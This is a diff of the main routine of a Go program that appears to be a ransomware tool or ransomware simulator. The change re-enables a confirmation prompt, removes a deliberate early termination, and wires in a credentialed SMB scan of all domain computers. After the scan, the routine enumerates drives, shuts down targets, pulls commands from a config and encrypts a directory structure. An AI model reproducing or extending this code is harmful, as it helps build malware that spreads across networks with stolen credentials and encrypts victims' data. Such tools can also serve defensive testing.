@@ -54,12 +54,12 @@ __________________________________________________
 [*]
 [*] --<[ WARNING ]>--    --<[ WARNING ]>--    --<[ WARNING ]>--
 `, *arg_directory)
-		//fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
-		//ans := []byte("N")
-		//os.Stdin.Read(ans)
-		//if ans[0] != 89 {
-        //    os.Exit(0)
-		//}
+		fmt.Printf("\n\r[*] DO YOU REALLY WANT TO PROCEED [Y|N]? ")
+		ans := []byte("N")
+		os.Stdin.Read(ans)
+		if ans[0] != 89 {
+            os.Exit(0)
+		}
 	}
 
     var config cjlib.YAML_CONFIG
@@ -80,20 +80,12 @@ __________________________________________________
         cjlib.SetDNSResolver(*arg_ns)
     }
 
-    cjlib.SMBScanDomainComputers(*arg_username, *arg_password, *arg_domain)
-    panic("... deliberate early termination ...")
-
-    //computerName := cjlib.WindowsComputerName()
-    //domain_status := cjlib.WindowsDomainStatus(computerName)
-    //fmt.Printf("[*] Windows Computer Name: %s\n", computerName)
-    //fmt.Printf("[*] Windows Domain Status: %s\n", domain_status)
-
     cjlib.Win32_GetLogicalDrives()
     cjlib.Win32_GetNativeSystemInfo()
     cjlib.Win32_RSMShutdownTargets()
     cjlib.Request_IOC_Commands(config)
     cjlib.Request_IOC_DNS(config)
-    //cjlib.SMBScanSubnet(*arg_username, *arg_password, *arg_domain)
+    cjlib.SMBScanDomainComputers(*arg_username, *arg_password, *arg_domain)
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
